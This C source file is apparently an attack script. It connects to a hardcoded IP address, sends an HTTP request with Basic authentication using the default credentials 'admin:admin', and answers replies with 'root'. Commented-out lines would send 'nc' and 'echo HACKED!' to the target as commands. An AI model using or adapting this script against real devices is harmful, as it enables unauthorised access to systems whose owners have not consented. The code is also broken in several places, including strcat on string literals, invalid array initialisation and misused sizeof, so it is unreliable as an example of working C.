#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>

char base64_map[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P','Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/'};

char* base64_encode(char* plain) {

	char counts = 0;
	char buffer[3];
	char* cipher = malloc(strlen(plain) * 4 / 3 + 4);
	int i = 0, c = 0;

	for (i = 0; plain[i] != '\0'; i++) {
		buffer[counts++] = plain[i];
		if (counts == 3) {
			cipher[c++] = base64_map[buffer[0] >> 2];
			cipher[c++] = base64_map[((buffer[0] & 0x03) << 4) + (buffer[1] >> 4)];
			cipher[c++] = base64_map[((buffer[1] & 0x0f) << 2) + (buffer[2] >> 6)];
			cipher[c++] = base64_map[buffer[2] & 0x3f];
			counts = 0;
		}
	}

	if (counts > 0) {
		cipher[c++] = base64_map[buffer[0] >> 2];
		if (counts == 1) {
			cipher[c++] = base64_map[(buffer[0] & 0x03) << 4];
			cipher[c++] = '=';
		} else {
			cipher[c++] = base64_map[((buffer[0] & 0x03) << 4) + (buffer[1] >> 4)];
			cipher[c++] = base64_map[(buffer[1] & 0x0f) << 2];
		}
		cipher[c++] = '=';
	}

	cipher[c] = '\0';
	return cipher;
}


int main() {
	int sockfd = 0, n = 0, connPort = 80;
	struct sockaddr_in serv_addr;
	char buff[256], connAddr[] = "172.238.141.253";

	char headers[] = strcat("GET / HTTP/1.1\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Language: en-us,en;q=0.5\nAccept-Encoding: gzip,deflate\nAccept-Charset: utf-8;q=0.7,*;q=0.7\nKeep-Alive: 300\nConnection: keep-alive\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36\nHost: ", connAddr);
	char headers_auth[] = strcat("\nAuthorization: Basic ", base64_encode("admin:admin"));

	memset(buff, '0', sizeof(buff));

	if (setSock(&sockfd) < 0)
		return 1;

	// set connection
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(connPort);
	serv_addr.sin_addr.s_addr = inet_addr(connAddr);

	if (setConn(&sockfd, &serv_addr) < 0)
		return 1;

	write(sockfd, headers, sizeof(headers));
	write(sockfd, headers_auth, sizeof(headers));

	// web part
	while((n = read(sockfd, buff, sizeof(buff) - 1)) > 0) {
		buff[n] = 0;

		//if (test == 1) {
		//	test = 0;
		//	write(sockfd, headers, sizeof(headers));
		//}

		//write(sockfd, "test", 4);
		//write(sockfd, headers, sizeof(headers));

		if (strstr(buff,"d") != NULL) {
			write(sockfd, "root\n", 5);
		}

		//if (strstr(buff,"Password") != NULL) {
		//	write(sockfd, "admin\n", 6);
		//	write(sockfd, "nc\n", 3);
		//}

		//if (strstr(buff, "Usage:") != NULL) {
		//	write(sockfd, "echo HACKED!\n", 13);
		//}

		// display on screen
		fputs(buff, stdout);
		printf("\n");
	}

	return 0;
}

int setSock(int *sockfd) {
	return (*sockfd = socket(AF_INET, SOCK_STREAM, 0));
}

int setConn(int *sockfd, struct sockaddr_in *serv_addr) {
	return connect(*sockfd, (struct sockaddr*) &*serv_addr, sizeof(*serv_addr));
}
